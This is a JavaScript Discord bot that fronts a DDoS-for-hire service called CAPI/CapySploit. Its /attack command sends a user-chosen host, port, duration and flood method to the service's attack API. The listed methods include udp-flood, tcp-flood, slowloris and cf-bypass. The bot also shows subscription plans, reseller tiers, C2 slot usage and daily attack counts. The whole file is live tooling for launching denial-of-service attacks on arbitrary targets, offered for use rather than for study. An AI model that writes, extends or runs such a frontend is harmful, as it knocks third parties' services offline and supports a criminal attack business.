import 'dotenv/config';
import { Client, GatewayIntentBits, ActivityType, Partials, REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ContainerBuilder, MessageFlags, SectionBuilder, SeparatorBuilder, TextDisplayBuilder, ThumbnailBuilder } from 'discord.js';
import * as Vault from './vault-db.js';
import { buildDiscordRoleNames, userPlanRole } from './discord.js';

const token = process.env.DISCORD_TOKEN;
const clientId = process.env.DISCORD_CLIENT_ID;
const guildId = process.env.DISCORD_GUILD_ID;
const apiBaseUrl = process.env.API_BASE_URL || 'https://capi.insideproxy.me';

console.log('Discord bot config loaded:', {
  hasToken: Boolean(token),
  hasClientId: Boolean(clientId),
  hasGuildId: Boolean(guildId),
  apiBaseUrl
});

if (!token) {
  throw new Error('DISCORD_TOKEN environment variable is required for the bot.');
}
if (!clientId) {
  throw new Error('DISCORD_CLIENT_ID environment variable is required for the bot.');
}

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages],
  partials: [Partials.Channel, Partials.GuildMember, Partials.Message, Partials.Reaction]
});

client.on('error', (error) => console.error('Discord client error:', error));
client.on('shardError', (error) => console.error('Discord shard error:', error));
client.on('invalidated', () => console.error('Discord client invalidated'));
client.on('disconnect', (event) => console.warn('Discord client disconnected:', event));
process.on('unhandledRejection', (reason) => console.error('Unhandled rejection:', reason));
process.on('uncaughtException', (error) => console.error('Uncaught exception:', error));

const DEFAULT_METHOD_NAMES = ['udp', 'tcp', 'http', 'https', 'cf-bypass', 'http-raw', 'https-raw', 'slowloris', 'tcp-flood', 'udp-flood'];

let statusIndex = 0;
let cachedMethodNames = null;
let methodCacheExpires = 0;
const attackMessageState = new Map();
let graphStatusMessageId = null;

async function fetchNetworkStats() {
  try {
    const response = await fetch(`${apiBaseUrl}/api/network_statistics`);
    const payload = await response.json();
    if (!payload || payload.error) {
      return { total_attacks_today: 0, vip_users_count: 0, holder_users_count: 0, reseller_users_count: 0, verified_discord_users_count: 0 };
    }
    return {
      total_attacks_today: Number(payload.total_attacks_today || 0),
      vip_users_count: Number(payload.vip_users_count || 0),
      holder_users_count: Number(payload.holder_users_count || 0),
      reseller_users_count: Number(payload.reseller_users_count || 0),
      verified_discord_users_count: Number(payload.verified_discord_users_count || 0)
    };
  } catch (error) {
    console.error('Failed to fetch network stats:', error);
    return { total_attacks_today: 0, vip_users_count: 0, holder_users_count: 0, reseller_users_count: 0, verified_discord_users_count: 0 };
  }
}

const statusRotations = [
  async () => {
    const stats = await fetchNetworkStats();
    return `Watching ${stats.total_attacks_today} attacks today`;
  },
  async () => {
    const stats = await fetchNetworkStats();
    return `Watching ${stats.vip_users_count} VIP users`;
  },
  async () => {
    const stats = await fetchNetworkStats();
    return `Watching ${stats.holder_users_count} holders`;
  },
  async () => {
    const stats = await fetchNetworkStats();
    return `Watching ${stats.reseller_users_count} resellers`;
  },
  async () => {
    const stats = await fetchNetworkStats();
    return `Watching ${stats.verified_discord_users_count} verified users`;
  }
];

async function fetchMethodNames() {
  const now = Date.now();
  if (cachedMethodNames && methodCacheExpires > now) {
    return cachedMethodNames;
  }

  try {
    const response = await fetch(`${apiBaseUrl}/admin/list_methods`);
    const payload = await response.json();
    const list = (payload && !payload.error && Array.isArray(payload.data?.methods))
      ? payload.data.methods.map((item) => (item.name || '').toLowerCase()).filter(Boolean)
      : DEFAULT_METHOD_NAMES;
    cachedMethodNames = list.length ? list : DEFAULT_METHOD_NAMES;
  } catch (error) {
    console.error('Failed to fetch method names:', error);
    cachedMethodNames = DEFAULT_METHOD_NAMES;
  }

  methodCacheExpires = now + 60_000;
  return cachedMethodNames;
}

async function updateStatus() {
  try {
    if (!client.user) return;
    const text = await statusRotations[statusIndex % statusRotations.length]();
    await client.user.setActivity(text, { type: ActivityType.Watching });
    statusIndex += 1;
  } catch (error) {
    console.error('Failed to update bot status:', error);
  }
}

function formatSlotBar(used, total) {
  const filled = total > 0 ? Math.round(Math.min(total, used) * 10 / total) : 0;
  const empty = 10 - filled;
  return `${'🔵'.repeat(filled)}${'⬜'.repeat(empty)} (${total === 0 ? '0.00' : ((used / total) * 100).toFixed(2)}%)`;
}

async function fetchGraphStats() {
  try {
    const response = await fetch(`${apiBaseUrl}/api/graph`);
    const payload = await response.json();
    if (!payload || payload.error) {
      return { apiSlotsTotal: 30, apiSlotsUsed: 0, apiSlotsAvailable: 30, apiPercent: '0.00', c2SlotsActive: 0, maintenance: false, lastMaintenance: 'None', uptime: '0s', updatedAt: new Date().toISOString() };
    }
    const data = payload.data || {};
    return {
      apiSlotsTotal: Number(data.api_slots?.total || 30),
      apiSlotsUsed: Number(data.api_slots?.used || 0),
      apiSlotsAvailable: Number(data.api_slots?.available || 0),
      apiPercent: String(data.api_slots?.percent || '0.00'),
      c2SlotsActive: Number(data.c2_slots?.active_attacks || 0),
      maintenance: Boolean(data.maintenance?.enabled || false),
      lastMaintenance: data.maintenance?.last_maintenance || 'None',
      uptime: data.uptime || '0s',
      updatedAt: data.updated_at || new Date().toISOString()
    };
  } catch (error) {
    console.error('Failed to fetch graph stats:', error);
    return { apiSlotsTotal: 30, apiSlotsUsed: 0, apiSlotsAvailable: 30, apiPercent: '0.00', c2SlotsActive: 0, maintenance: false, lastMaintenance: 'None', uptime: '0s', updatedAt: new Date().toISOString() };
  }
}

function buildGraphContainer(stats) {
  const statusLabel = stats.maintenance ? 'Maintenance' : 'Live';
  const updatedAt = new Date(stats.updatedAt || Date.now()).getTime();
  return new ContainerBuilder()
    .setAccentColor(stats.maintenance ? 0xF39C12 : 0x2ECC71)
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent('## 📊 Graph - Real-time Statistics')
    )
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(`**Status:** ${statusLabel}`)
    )
    .addSeparatorComponents(new SeparatorBuilder())
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(
        `**API Slots**\n` +
        `Total: ${stats.apiSlotsTotal}\n` +
        `Used: ${stats.apiSlotsUsed}\n` +
        `${formatSlotBar(stats.apiSlotsUsed, stats.apiSlotsTotal)}`
      )
    )
    .addSeparatorComponents(new SeparatorBuilder())
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(
        `**C2 Slots**\n` +
        `Active: ${stats.c2SlotsActive}\n` +
        `**Uptime:** ${stats.uptime}\n` +
        `**Last Maintenance:** ${stats.lastMaintenance}`
      )
    )
    .addSeparatorComponents(new SeparatorBuilder())
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(`**Updated:** <t:${Math.floor(updatedAt / 1000)}:R>`)
    )
    .addActionRowComponents(
      new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setStyle(ButtonStyle.Secondary)
          .setLabel('Refresh')
          .setCustomId('graph_refresh')
      )
    );
}

function buildAttackContainer(state, now = Date.now()) {
  const elapsedSeconds = Math.max(0, Math.floor((now - state.startTime) / 1000));
  const remainingSeconds = Math.max(0, Number(state.durationSeconds || 0) - elapsedSeconds);
  const statusLine = remainingSeconds > 0
    ? `**Status:** Running • **Elapsed:** ${elapsedSeconds}s • **Remaining:** ${remainingSeconds}s`
    : '**Status:** Completed';

  return new ContainerBuilder()
    .setAccentColor(0x00D4FF)
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent('## ⚔️ Attack Status')
    )
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(`**Target:** ${state.targetLabel || state.host}:${state.port}`)
    )
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(`**Method:** ${state.methodLabel || state.method} • **Duration:** ${state.durationSeconds}s`)
    )
    .addSeparatorComponents(new SeparatorBuilder())
    .addTextDisplayComponents(
      new TextDisplayBuilder().setContent(
        `${statusLine}\n` +
        `**Max Concurrents:** ${state.maxConcurrents ?? 'N/A'}\n` +
        `**API Slots:** ${state.apiSlots ?? 'N/A'}`
      )
    )
    .addActionRowComponents(
      new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setStyle(ButtonStyle.Secondary)
          .setLabel('Refresh')
          .setCustomId('attack_refresh')
      )
    );
}

const linkCommand = new SlashCommandBuilder()
  .setName('link')
  .setDescription('Verify your Discord account with CAPI using a verification code')
  .addStringOption(option => option.setName('code').setDescription('Verification code from the API').setRequired(true));

const unlinkCommand = new SlashCommandBuilder()
  .setName('unlink')
  .setDescription('Request a Discord unlink for your CAPI account');

const planCommand = new SlashCommandBuilder()
  .setName('plan')
  .setDescription('Show your CAPI account profile and linked status');

const methodsCommand = new SlashCommandBuilder()
  .setName('methods')
  .setDescription('List all supported attack methods');

const graphCommand = new SlashCommandBuilder()
  .setName('graph')
  .setDescription('Show live API and C2 slot statistics')
  .setDMPermission(true);

const attackCommand = new SlashCommandBuilder()
  .setName('attack')
  .setDescription('Launch an attack through CAPI')
  .setDMPermission(true)
  .addStringOption(option => option.setName('hostname').setDescription('Target host or IP').setRequired(true))
  .addStringOption(option => option.setName('port').setDescription('Target port').setRequired(true))
  .addStringOption(option => option.setName('time').setDescription('Attack duration in seconds').setRequired(true))
  .addStringOption(option => option.setName('method').setDescription('Attack method').setRequired(true).setAutocomplete(true));

async function registerCommands() {
  const rest = new REST({ version: '10' }).setToken(token);
  const commands = [linkCommand.toJSON(), planCommand.toJSON(), unlinkCommand.toJSON(), methodsCommand.toJSON(), graphCommand.toJSON(), attackCommand.toJSON()];
  try {
    await rest.put(Routes.applicationCommands(clientId), { body: commands });
    console.log('Registered global slash commands.');
  } catch (err) {
    console.error('Failed to register slash commands:', err);
  }
}

async function ensureRole(member, roleName) {
  const role = member.guild.roles.cache.find(r => r.name === roleName);
  if (!role) return null;
  if (!member.roles.cache.has(role.id)) {
    await member.roles.add(role);
  }
  return role;
}

async function postOrUpdateGraphStatusMessage() {
  const statusChannelId = process.env.DISCORD_STATUS_CHANNEL_ID;
  if (!statusChannelId) return;
  try {
    const channel = await client.channels.fetch(statusChannelId);
    if (!channel || typeof channel.send !== 'function') return;
    const stats = await fetchGraphStats();
    const container = buildGraphContainer(stats);
    if (graphStatusMessageId) {
      try {
        const existing = await channel.messages.fetch(graphStatusMessageId);
        await existing.edit({ components: [container], flags: MessageFlags.IsComponentsV2 });
        return;
      } catch (error) {
        graphStatusMessageId = null;
      }
    }
    const message = await channel.send({ components: [container], flags: MessageFlags.IsComponentsV2 });
    graphStatusMessageId = message.id;
  } catch (error) {
    console.error('Failed to update graph status message:', error);
  }
}

client.once('ready', async () => {
  console.log(`Discord bot logged in as ${client.user.tag}`);
  await registerCommands();
  await updateStatus();
  await postOrUpdateGraphStatusMessage();
  setInterval(updateStatus, 30_000);
  setInterval(postOrUpdateGraphStatusMessage, 60_000);
});

client.on('interactionCreate', async (interaction) => {
  if (interaction.isButton()) {
    if (interaction.customId === 'delete_plan_message') {
      try {
        await interaction.deferUpdate();
        if (interaction.message?.deletable) {
          await interaction.message.delete();
        }
      } catch (error) {
        console.error('Failed to delete plan message:', error);
      }
      return;
    }

    if (interaction.customId === 'plan_refresh') {
      try {
        await interaction.deferUpdate();
      } catch (error) {
        console.error('Failed to defer refresh interaction:', error);
      }
      return;
    }

    if (interaction.customId === 'attack_refresh') {
      const state = attackMessageState.get(interaction.message?.id);
      if (!state) {
        await interaction.update({ content: 'This attack card is no longer available.', flags: MessageFlags.Ephemeral });
        return;
      }

      const container = buildAttackContainer(state);
      attackMessageState.set(interaction.message.id, { ...state, lastRefreshedAt: Date.now() });
      await interaction.update({ components: [container], flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral });
      return;
    }

    if (interaction.customId === 'graph_refresh') {
      const stats = await fetchGraphStats();
      const container = buildGraphContainer(stats);
      await interaction.update({ components: [container], flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral });
      return;
    }

    return;
  }

  if (interaction.isAutocomplete()) {
    if (interaction.commandName === 'attack') {
      const focused = interaction.options.getFocused();
      const methods = await fetchMethodNames();
      const choices = methods
        .filter((name) => name.toLowerCase().startsWith(String(focused || '').toLowerCase()))
        .slice(0, 25)
        .map((name) => ({ name, value: name }));
      await interaction.respond(choices);
      return;
    }
    return;
  }

  if (!interaction.isChatInputCommand()) return;

  const discordUserId = interaction.user.id;
  const discordUsername = interaction.user.username;

  if (interaction.commandName === 'link') {
    const code = interaction.options.getString('code');
    const response = await fetch(`${apiBaseUrl}/api/link?code=${encodeURIComponent(code)}&discord_user_id=${encodeURIComponent(discordUserId)}&discord_username=${encodeURIComponent(discordUsername)}&client=discord`);
    const payload = await response.json();

    if (payload.error) {
      await interaction.reply({ content: `Verification failed: ${payload.message}`, ephemeral: true });
      return;
    }

    const guild = interaction.guild;
    if (guild) {
      try {
        const member = await guild.members.fetch(discordUserId);
        const rolesToAdd = payload.roles || [];
        const assigned = [];
        for (const roleName of rolesToAdd) {
          const role = await ensureRole(member, roleName);
          if (role) assigned.push(role.name);
        }
        await interaction.reply({ content: `Verified ${payload.username}! Roles assigned: ${assigned.join(', ') || 'none'}.`, ephemeral: true });
        return;
      } catch (err) {
        console.error('Role assign failed:', err);
      }
    }

    await interaction.reply({ content: `Verified ${payload.username}! Use the code on the API side if role assignment did not apply.`, ephemeral: true });
    return;
  }

  if (interaction.commandName === 'plan') {
    const response = await fetch(`${apiBaseUrl}/api/discord_profile?discord_user_id=${encodeURIComponent(discordUserId)}`);
    const payload = await response.json();
    if (payload.error) {
      const message = payload.message || 'Unable to load profile. Use /link to verify first.';
      await interaction.reply({ content: message, ephemeral: true });
      return;
    }

    const profile = payload.data.profile;
    const expiry = profile.expiry_unix ? new Date(Number(profile.expiry_unix)).toLocaleString('en-GB', { timeZone: 'UTC' }) : 'Never';
    const boolLabel = (value) => (value ? 'Yes' : 'No');
    const statusColor = profile.is_banned ? 0xE74C3C : profile.account_status === 'at_limit' ? 0xF39C12 : 0x2ECC71;
    const linkedText = profile.discord_link.linked ? 'Yes' : 'No';

    const container = new ContainerBuilder()
      .setAccentColor(statusColor)
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('## 📜 Your Plan Details')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('> *Don\'t share your plan details with others!*')
      )
      .addSeparatorComponents(new SeparatorBuilder())
      .addSectionComponents(
        new SectionBuilder()
          .setThumbnailAccessory(
            new ThumbnailBuilder().setURL(interaction.user.displayAvatarURL({ extension: 'png', size: 256 }))
          )
          .addTextDisplayComponents(
            new TextDisplayBuilder().setContent(
              `**Username:** ${profile.username}\n` +
              `**Cooldown:** ${profile.cooldown}s\n` +
              `**Max Daily Attacks:** ${profile.max_daily_attacks}\n` +
              `**Max Concurrent Attacks:** ${profile.max_concurrents}`
            )
          )
      )
      .addSeparatorComponents(new SeparatorBuilder())
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent(
          `**VIP:** ${boolLabel(profile.vip)}\n` +
          `**Reseller:** ${boolLabel(profile.reseller)}\n` +
          `**Admin:** ${boolLabel(profile.admin)}\n\n` +
          `**Discord Link:** ${linkedText}\n` +
          `**Suspended:** ${boolLabel(profile.is_banned)}\n` +
          `**Expiry:** ${expiry}`
        )
      )
      .addSeparatorComponents(new SeparatorBuilder())
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('CapySploit • Plan Panel • WIP • Stay Tuned')
      )
      .addActionRowComponents(
        new ActionRowBuilder().addComponents(
          new ButtonBuilder()
            .setStyle(ButtonStyle.Link)
            .setLabel('View API')
            .setURL(`${apiBaseUrl}/api/view_profile?username=${encodeURIComponent(profile.username)}`),
          new ButtonBuilder()
            .setStyle(ButtonStyle.Secondary)
            .setLabel('Refresh')
            .setCustomId('plan_refresh'),
          new ButtonBuilder()
            .setStyle(ButtonStyle.Danger)
            .setLabel('Delete Message')
            .setCustomId('delete_plan_message')
        )
      );

    await interaction.reply({
      components: [container],
      flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral
    });
    return;
  }

  if (interaction.commandName === 'graph') {
    const stats = await fetchGraphStats();
    const container = buildGraphContainer(stats);
    await interaction.reply({ components: [container], flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral });
    return;
  }

  if (interaction.commandName === 'methods') {
    const response = await fetch(`${apiBaseUrl}/admin/list_methods`);
    const payload = await response.json();
    if (payload.error) {
      await interaction.reply({ content: payload.message || 'Unable to load methods.', ephemeral: true });
      return;
    }

    const methods = (payload.data?.methods || []).map((method) => `• **${method.name}** — ${method.description || 'No description'}`).join('\n');
    await interaction.reply({ content: `**Supported methods:**\n${methods || 'No methods available.'}`, ephemeral: true });
    return;
  }

  if (interaction.commandName === 'attack') {
    const host = interaction.options.getString('hostname');
    const port = interaction.options.getString('port');
    const time = interaction.options.getString('time');
    const method = interaction.options.getString('method');

    const profileResponse = await fetch(`${apiBaseUrl}/api/discord_profile?discord_user_id=${encodeURIComponent(discordUserId)}`);
    const profilePayload = await profileResponse.json();
    if (profilePayload.error) {
      await interaction.reply({ content: profilePayload.message || 'You must link your Discord account before launching an attack. Use /link first.', ephemeral: true });
      return;
    }

    const profile = profilePayload.data.profile;
    if (!profile.api_access) {
      await interaction.reply({ content: 'Your account does not have API access enabled.', ephemeral: true });
      return;
    }

    const username = profile.username;
    const response = await fetch(`${apiBaseUrl}/api/attack?username=${encodeURIComponent(username)}&host=${encodeURIComponent(host)}&port=${encodeURIComponent(port)}&time=${encodeURIComponent(time)}&method=${encodeURIComponent(method)}`);
    const payload = await response.json();
    if (payload.error) {
      const hint = payload.hint ? ` ${payload.hint}` : '';
      await interaction.reply({ content: `Attack failed: ${payload.message || 'unknown error'}.${hint}`, ephemeral: true });
      return;
    }

    const attackDetails = payload.data || {};
    const methodLabel = attackDetails.Method_Used || method;
    const targetLabel = attackDetails.Target || host;
    const durationSeconds = Number(attackDetails.Time_Used || time || 0);
    const attackState = {
      host,
      port,
      time: String(durationSeconds),
      method,
      methodLabel,
      targetLabel,
      durationSeconds,
      startTime: Date.now(),
      maxConcurrents: profile.max_concurrents ?? 'N/A',
      apiSlots: attackDetails.Global_API_Slots ?? 'N/A'
    };

    const container = buildAttackContainer(attackState);
    const reply = await interaction.reply({
      components: [container],
      flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral
    });
    if (reply?.id) {
      attackMessageState.set(reply.id, attackState);
    }
    return;
  }

  if (interaction.commandName === 'unlink') {
    const response = await fetch(`${apiBaseUrl}/api/unlink?discord_user_id=${encodeURIComponent(discordUserId)}`);
    const payload = await response.json();
    if (payload.error) {
      await interaction.reply({ content: payload.message || 'Unable to unlink your Discord account.', ephemeral: true });
      return;
    }
    await interaction.reply({ content: `Your Discord account has been unlinked from CAPI. You can now run /link again with a new verification code.`, ephemeral: true });
    return;
  }

  return;
});

console.log('Starting Discord bot...');
client.login(token).catch((error) => {
  console.error('Failed to login Discord bot:', error);
  process.exit(1);
});
